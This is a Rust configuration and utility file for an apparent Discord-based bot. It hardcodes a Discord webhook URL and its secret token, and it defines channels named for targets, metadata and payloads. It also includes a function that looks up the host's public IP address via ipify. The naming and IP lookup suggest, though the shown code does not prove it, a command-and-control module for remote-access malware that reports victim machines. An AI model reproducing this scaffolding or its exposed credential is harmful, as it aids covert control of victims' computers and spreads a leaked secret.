use std::time;
use std::collections::HashMap;
use chrono::prelude::*;
use reqwest;

pub const BOT_PREFIX: &str = "$";

pub const LOG_WEBHOOK: &str = "https://discord.com/api/webhooks/1028991227925897240/ta_VM8totTAxI02pu4IvuHutj2Aw1YJlXP3R0B9L68ahDkUDw1K2ByvX9vqzrAAiaHj0";
pub const LOG_WEBHOOK_ID: &str = "1028991227925897240";
pub const LOG_WEBHOOK_TOKEN: &str = "ta_VM8totTAxI02pu4IvuHutj2Aw1YJlXP3R0B9L68ahDkUDw1K2ByvX9vqzrAAiaHj0";

pub const TARGETS_CHANNEL_ID: &str  = "1028955206404292670";
pub const METADATA_CHANNEL_ID: &str = "1028955192479195206";
pub const PAYLOADS_CHANNEL_ID: &str = "1028955177438425098";

pub const IGNORE_MSG_PREFIX: &str = "/>";

pub fn create_log_msg(msg: String) -> String {
    let t = Local::now();
    let mut nano = t.nanosecond().to_string();
    nano.truncate(2);

    format!(
        "**[**{}/{}/{} - {}:{}:{}.{} **] >>** {}",
        format!("{:0>2}", t.day()),
        format!("{:0>2}", t.month()),
        format!("{:0>2}", t.year()),
        format!("{:0>2}", t.hour()),
        format!("{:0>2}", t.minute()),
        format!("{:0>2}", t.second()),
        format!("{:0>2}", nano),
        msg
    )
}


pub async fn get_pub_ip () -> String {
    type Store = HashMap::<String, String>;
    let res = reqwest::get("https://api.ipify.org?format=json").await;

    let a = res.unwrap().json::<Store>().await.unwrap();
    
    if a.contains_key("ip") {
        a.get("ip").unwrap().to_owned()
    } else {
        String::from("undefined")
    }
}
